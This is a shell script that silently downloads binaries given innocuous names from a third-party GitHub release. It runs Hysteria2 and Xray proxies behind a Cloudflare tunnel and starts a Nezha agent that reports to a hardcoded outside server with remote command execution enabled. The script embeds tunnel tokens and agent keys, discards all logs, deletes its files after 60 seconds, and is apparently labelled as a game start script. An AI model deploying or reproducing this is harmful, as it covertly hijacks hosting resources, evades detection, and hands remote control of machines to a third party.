#!/bin/sh

# ==================== VARIABLES ====================
export UUID=${UUID:-'faacf142-dee8-48c2-8558-641123eb939c'}
export PASSWORD="$UUID"
export HYSTERIA_PORT=${SERVER_PORT:-${PORT:-7860}}
export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.mingfei1981.eu.org'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_KEY=${NEZHA_KEY:-'nuYKd07SS4k1w9xvv6'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-'hidencloud.5.d.0.0.9.2.f.1.0.7.4.0.1.0.0.2.ip6.arpa'}
export ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMWFjM2RkZGItYWZlYy00NDJmLThkY2YtYjY2ZDZiNTA4OGMzIiwicyI6Ik1HTTFaakExTTJRdE5tVm1OeTAwWkRSa0xUaG1ZMlF0T1RBek5tWTJZMlkwWVdNeiJ9'}
export CFIP=${CFIP:-'time.is'}
export CFPORT=${CFPORT:-'443'}
export NAME=${NAME:-'MJJ'}
export ARGO_PORT=${ARGO_PORT:-'8001'}

# ==================== DOWNLOAD FUNCTION (silent) ====================
download_file() {
local url="$1"
local filename="$2"
if curl -sL --fail "$url" -o "$filename"; then
true
else
exit 1
fi
}

# ==================== ARCH DETECTION & DOWNLOAD ====================
ARCH=$(uname -m)
if [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
download_file "https://github.com/apernet/hysteria/releases/download/app%2Fv2.6.5/hysteria-linux-arm64" "icchy"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/armv2" "iccv2"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/arm64agent" "iccagent"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/arm642go" "icc2go"
elif [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
download_file "https://github.com/apernet/hysteria/releases/download/app%2Fv2.6.5/hysteria-linux-amd64" "icchy"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/amdv2" "iccv2"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/amd64agent" "iccagent"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/amd642go" "icc2go"
else
exit 1
fi

chmod +x "icchy" "iccv2" "iccagent" "icc2go" 2>/dev/null

# ==================== GENERATE HY CERTIFICATES ====================
openssl ecparam -name prime256v1 -genkey -noout -out server.key >/dev/null 2>&1
openssl req -new -x509 -key server.key -out server.crt -subj "/CN=www.bing.com" -days 36500 >/dev/null 2>&1

# ==================== HYSTERIA2 CONFIG ====================
cat > hy_config.json << EOF
{
  "listen": ":$HYSTERIA_PORT",
  "tls": {
    "cert": "server.crt",
    "key": "server.key"
  },
  "auth": {
    "type": "password",
    "password": "$PASSWORD"
  },
  "quic": {
    "maxIdleTimeout": "30s",
    "disablePathMTUDiscovery": false
  },
  "udpIdleTimeout": "60s",
  "disableUDP": false,
  "ignoreClientBandwidth": false
}
EOF

# ==================== XRAY CONFIG ====================
cat > v2_config.json << EOF
{
"log": { "access": "/dev/null", "error": "/dev/null", "loglevel": "none" },
"inbounds": [
{
"port": $ARGO_PORT,
"protocol": "vless",
"settings": {
"clients": [{ "id": "${UUID}", "flow": "xtls-rprx-vision" }],
"decryption": "none",
"fallbacks": [
{ "dest": 3001 }, { "path": "/vless-argo", "dest": 3002 },
{ "path": "/vmess-argo", "dest": 3003 }, { "path": "/trojan-argo", "dest": 3004 }
]
},
"streamSettings": { "network": "tcp" }
},
{ "port": 3001, "listen": "127.0.0.1", "protocol": "vless", "settings": { "clients": [{ "id": "${UUID}" }], "decryption": "none" }, "streamSettings": { "network": "tcp", "security": "none" } },
{ "port": 3002, "listen": "127.0.0.1", "protocol": "vless", "settings": { "clients": [{ "id": "${UUID}" }], "decryption": "none" }, "streamSettings": { "network": "ws", "security": "none", "wsSettings": { "path": "/vless-argo" } }, "sniffing": { "enabled": true, "destOverride": ["http", "tls", "quic"] } },
{ "port": 3003, "listen": "127.0.0.1", "protocol": "vmess", "settings": { "clients": [{ "id": "${UUID}", "alterId": 0 }] }, "streamSettings": { "network": "ws", "wsSettings": { "path": "/vmess-argo" } }, "sniffing": { "enabled": true, "destOverride": ["http", "tls", "quic"] } },
{ "port": 3004, "listen": "127.0.0.1", "protocol": "trojan", "settings": { "clients": [{ "password": "${UUID}" }] }, "streamSettings": { "network": "ws", "security": "none", "wsSettings": { "path": "/trojan-argo" } }, "sniffing": { "enabled": true, "destOverride": ["http", "tls", "quic"] } }
],
"dns": { "servers": ["https+local://8.8.8.8/dns-query"] },
"outbounds": [ { "protocol": "freedom", "tag": "direct" }, { "protocol": "blackhole", "tag": "block" } ]
}
EOF

# ==================== ARGO CONFIG ====================
if [ -n "$ARGO_AUTH" ] && [ -n "$ARGO_DOMAIN" ]; then
if echo "$ARGO_AUTH" | grep -q "TunnelSecret"; then
echo "$ARGO_AUTH" > tunnel.json
cat > tunnel.yml << EOF
tunnel: $(echo "$ARGO_AUTH" | cut -d\" -f12)
credentials-file: tunnel.json
protocol: http2
ingress:
- hostname: $ARGO_DOMAIN
service: http://localhost:$ARGO_PORT
originRequest:
noTLSVerify: true
- service: http_status:404
EOF
fi
fi

# ==================== START SERVICES (silent) ====================
nohup ./"icchy" server -c hy_config.json > /dev/null 2>&1 &
nohup ./"iccv2" -c v2_config.json > /dev/null 2>&1 &

if [ -n "$ARGO_AUTH" ]; then
if echo "$ARGO_AUTH" | grep -q "^[A-Z0-9a-z=]\{120,250\}$"; then
nohup ./"icc2go" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token "${ARGO_AUTH}" > argo.log 2>&1 &
elif echo "$ARGO_AUTH" | grep -q "TunnelSecret"; then
nohup ./"icc2go" tunnel --edge-ip-version auto --config tunnel.yml run > argo.log 2>&1 &
else
nohup ./"icc2go" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile argo.log --loglevel info --url http://localhost:$ARGO_PORT > /dev/null 2>&1 &
fi
else
nohup ./"icc2go" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile argo.log --loglevel info --url http://localhost:$ARGO_PORT > /dev/null 2>&1 &
fi

tlsPorts=("443" "8443" "2096" "2087" "2083" "2053")
# Use POSIX shell compatible way for checking array membership
check_port() {
  local search="$1"
  shift
  for element in "$@"; do
    if [ "$element" = "$search" ]; then
      return 0 # Found
    fi
  done
  return 1 # Not found
}

if check_port "$NEZHA_PORT" "${tlsPorts[@]}"; then
NEZHA_TLS="--tls"
else
NEZHA_TLS=""
fi

if [ -n "$NEZHA_SERVER" ] && [ -n "$NEZHA_KEY" ]; then
if [ -n "$NEZHA_PORT" ]; then
nohup ./"iccagent" -s "${NEZHA_SERVER}:${NEZHA_PORT}" -p "${NEZHA_KEY}" ${NEZHA_TLS} > /dev/null 2>&1 &
else
cat > nezha.yaml << EOF
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: $( echo "$NEZHA_SERVER" | grep -q ':[48]\{1\}43$' || echo "$NEZHA_SERVER" | grep -q ':20[589][367]$' || echo "$NEZHA_SERVER" | grep -q ':8443$' ; [ $? -eq 0 ] && echo true || echo false )
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}
EOF
nohup ./"iccagent" -c nezha.yaml > /dev/null 2>&1 &
fi
fi

# ==================== GET PUBLIC INFO (silent) ====================
sleep 15
HOST_IP=$(curl -s ipv4.ip.sb || curl -s ipv6.ip.sb)
ISP=$(curl -s https://speed.cloudflare.com/meta | awk -F\" '{print $26"-"$18}' | sed 's/ /_/g')

if [ -n "$ARGO_DOMAIN" ]; then
ARGO_DOMAIN_FINAL="$ARGO_DOMAIN"
else
ARGO_DOMAIN_FINAL=$(grep -oE "https://[a-z0-9.-]*\.trycloudflare\.com" argo.log | head -1 | cut -d/ -f3)
[ -z "$ARGO_DOMAIN_FINAL" ] && ARGO_DOMAIN_FINAL="temporary-tunnel-not-ready.trycloudflare.com"
fi

# ==================== GENERATE SUBSCRIPTION (silent) ====================
cat > sub.txt << EOF
start install success

=== HY2 ===
hysteria2://$PASSWORD@$HOST_IP:$HYSTERIA_PORT/?insecure=1&sni=www.bing.com#$NAME-HY-$ISP

=== VLESS-WS-ARGO ===
vless://$UUID@$CFIP:443?encryption=none&security=tls&sni=$ARGO_DOMAIN_FINAL&type=ws&host=$ARGO_DOMAIN_FINAL&path=%2Fvless-argo%3Fed%3D2560#$NAME-VLESS-$ISP

=== VMESS-WS-ARGO ===
vmess://$(echo -n "{ \"v\": \"2\", \"ps\": \"$NAME-VMESS-$ISP\", \"add\": \"$CFIP\", \"port\": \"443\", \"id\": \"$UUID\", \"aid\": \"0\", \"scy\": \"none\", \"net\": \"ws\", \"type\": \"none\", \"host\": \"$ARGO_DOMAIN_FINAL\", \"path\": \"/vmess-argo?ed=2560\", \"tls\": \"tls\", \"sni\": \"$ARGO_DOMAIN_FINAL\" }" | base64 -w0)

=== TROJAN-WS-ARGO ===
trojan://$UUID@$CFIP:443?security=tls&sni=$ARGO_DOMAIN_FINAL&type=ws&host=$ARGO_DOMAIN_FINAL&path=%2Ftrojan-argo%3Fed%3D2560#$NAME-TROJAN-$ISP
EOF

base64 -w0 sub.txt > sub_base64.txt

# ==================== AUTO CLEANUP AFTER 60 SECONDS (in background) ====================

(
sleep 60
rm -rf icchy iccv2 iccagent icc2go server.key server.crt hy_config.json v2_config.json tunnel.json tunnel.yml nezha.yaml argo.log sub.txt sub_base64.txt core core.*
) &

# ==================== START GAME (KEEP ALIVE) ====================

tail -f /dev/null
